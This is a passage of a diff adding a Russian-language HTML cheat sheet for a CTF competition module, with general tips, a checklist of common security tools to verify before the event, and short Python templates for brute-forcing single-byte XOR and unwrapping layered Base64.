+                <li>❌ Не игнорируй легкие задачи</li>
+                <li>❌ Не забывай про время</li>
+                <li>❌ Не паникуй - спокойствие = победа</li>
+            </ul>
+        </div>
+
+        <h3>🔧 Чек-лист инструментов:</h3>
+        <div class="category-box">
+            <pre><code># Перед соревнованием проверь:
+□ Python3 установлен
+□ CyberChef открывается
+□ Burp Suite работает
+□ Ghidra запускается
+□ Wireshark открывает .pcap
+□ strings, binwalk, exiftool работают
+□ /usr/share/wordlists/rockyou.txt существует
+□ hashcat/john установлены
+□ steghide, zsteg работают
+
+# Тестовые команды:
+python3 --version
+burpsuite &
+strings /bin/ls
+binwalk --help
+exiftool --help</code></pre>
+        </div>
+
+        <h3>📝 Шаблоны скриптов:</h3>
+        <div class="category-box">
+            <h4>Python template для XOR:</h4>
+            <pre><code>#!/usr/bin/env python3
+
+def xor(data, key):
+    return bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])
+
+# Однобайтовый XOR брутфорс
+def single_byte_xor_bruteforce(data):
+    for key in range(256):
+        result = bytes([b ^ key for b in data])
+        if b'flag{' in result or b'FLAG' in result:
+            print(f"Key: {key} ({chr(key)})")
+            print(result)
+
+# Использование
+encrypted = bytes.fromhex("...")
+single_byte_xor_bruteforce(encrypted)</code></pre>
+
+            <h4>Python template для Base64 layers:</h4>
+            <pre><code>#!/usr/bin/env python3
+import base64
+
+data = "ZmxhZ3t0ZXN0fQ=="
+
+# Декодируй пока возможно
+for i in range(10):
+    try:
+        data = base64.b64decode(data).decode()
+        print(f"Layer {i+1}: {data}")
+    except:
+        break</code></pre>
+        </div>
+
+        <div class="success">
+            <strong>🎯 ГЛАВНОЕ:</strong><br>
+            • У тебя есть ВСЕ инструменты<br>
+            • У тебя есть эта шпаргалка<br>
+            • Не спеши, читай условия внимательно<br>
+            • Начинай с простых задач<br>
+            • Удачи на соревновании! 🚀
+        </div>
+
+        <div style="text-align: center; margin-top: 50px; padding: 30px; background: rgba(88, 166, 255, 0.1); border-radius: 10px;">
+            <h2 style="color: #58a6ff; margin-bottom: 15px;">🏆 Ты справишься!</h2>
+            <p style="color: #888; font-size: 1.1em;">REASkills 2026 | Module A - CTF</p>
+            <p style="color: #666; margin-top: 10px;">Создано для: Emiliano | by Perplexity AI</p>
+        </div>
+    </div>
+
+    <button class="scroll-top" onclick="window.scrollTo({top: 0, behavior: 'smooth'})">↑</button>
+</body>
+</html>
